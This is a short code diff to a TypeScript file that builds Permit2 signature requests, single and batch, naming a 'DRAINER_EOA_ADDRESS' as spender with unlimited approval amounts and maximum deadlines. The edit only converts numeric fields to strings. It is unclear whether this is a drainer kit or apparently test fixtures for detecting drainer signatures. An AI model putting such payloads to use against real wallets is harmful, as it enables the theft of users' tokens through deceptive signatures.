@@ -72,11 +72,11 @@ export const getPermit2TypedData = (chainId: number) => {
     },
     message: {
       spender: DRAINER_EOA_ADDRESS,
-      sigDeadline: MAX_DEADLINE,
+      sigDeadline: MAX_DEADLINE.toString(),
       details: {
         token: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
-        amount: UNLIMITED_APPROVAL_AMOUNT,
-        expiration: MAX_DEADLINE,
+        amount: UNLIMITED_APPROVAL_AMOUNT.toString(),
+        expiration: MAX_DEADLINE.toString(),
         nonce: 0,
       },
     },
@@ -141,18 +141,18 @@ export const getPermit2PermitBatchTypedData = (chainId: number) => {
     },
     message: {
       spender: DRAINER_EOA_ADDRESS,
-      sigDeadline: MAX_DEADLINE,
+      sigDeadline: MAX_DEADLINE.toString(),
       details: [
         {
           token: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
-          amount: UNLIMITED_APPROVAL_AMOUNT,
-          expiration: MAX_DEADLINE,
+          amount: UNLIMITED_APPROVAL_AMOUNT.toString(),
+          expiration: MAX_DEADLINE.toString(),
           nonce: 0,
         },
         {
           token: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
-          amount: UNLIMITED_APPROVAL_AMOUNT,
-          expiration: MAX_DEADLINE,
+          amount: UNLIMITED_APPROVAL_AMOUNT.toString(),
+          expiration: MAX_DEADLINE.toString(),
           nonce: 0,
         },
       ],
